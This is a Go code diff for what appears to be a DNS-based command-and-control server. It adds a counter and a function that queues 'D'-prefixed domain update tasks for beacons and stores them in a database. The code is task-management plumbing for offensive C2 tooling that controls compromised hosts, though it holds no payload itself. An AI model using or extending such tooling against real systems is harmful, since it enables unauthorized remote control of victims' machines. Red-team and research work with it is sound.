@@ -97,7 +97,8 @@ type C2Manager struct {
 	resultBatchBuffer    map[string][]ResultChunk        // key: taskID, value: buffered chunks for batching
 	resultBatchTimer     map[string]*time.Timer          // key: taskID, value: batch flush timer
 	mutex                sync.RWMutex
-	taskCounter          int
+	taskCounter          int // Counter for local tasks (standalone mode)
+	domainTaskCounter    int // Counter for domain update tasks (D prefix to avoid conflicts)
 	debug                bool
 	aesKey               []byte
 	jitterConfig         StagerJitter // Stager timing configuration
@@ -2211,6 +2212,46 @@ func (c2 *C2Manager) AddTask(beaconID, command string) string {
 	}
 
 	logf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, taskID)
+	return ""
+}
+
+// AddDomainUpdateTask adds a domain update task (DNS-server-initiated)
+// Uses "D" prefix (D0001, D0002) instead of "T" to avoid conflicts with Master task IDs
+func (c2 *C2Manager) AddDomainUpdateTask(beaconID, command string) string {
+	c2.mutex.Lock()
+	defer c2.mutex.Unlock()
+
+	// Generate domain update task ID with D prefix
+	c2.domainTaskCounter++
+	taskID := fmt.Sprintf("D%04d", c2.domainTaskCounter)
+
+	task := &Task{
+		ID:        taskID,
+		BeaconID:  beaconID,
+		Command:   command,
+		Status:    "pending",
+		CreatedAt: time.Now(),
+	}
+
+	c2.tasks[taskID] = task
+
+	// Save task to database (async to avoid blocking)
+	if c2.db != nil {
+		go func(t *Task) {
+			if err := c2.db.SaveTask(t); err != nil && c2.debug {
+				logf("[C2] Failed to save domain update task to database: %v", err)
+			}
+		}(task)
+	}
+
+	// Add to beacon's task queue
+	if beacon, exists := c2.beacons[beaconID]; exists {
+		beacon.TaskQueue = append(beacon.TaskQueue, *task)
+		logf("[C2] Added domain update task %s for beacon %s", taskID, beaconID)
+		return taskID
+	}
+
+	logf("[C2] ERROR: Beacon %s not found when adding domain update task %s", beaconID, taskID)
 	return ""
 }
 
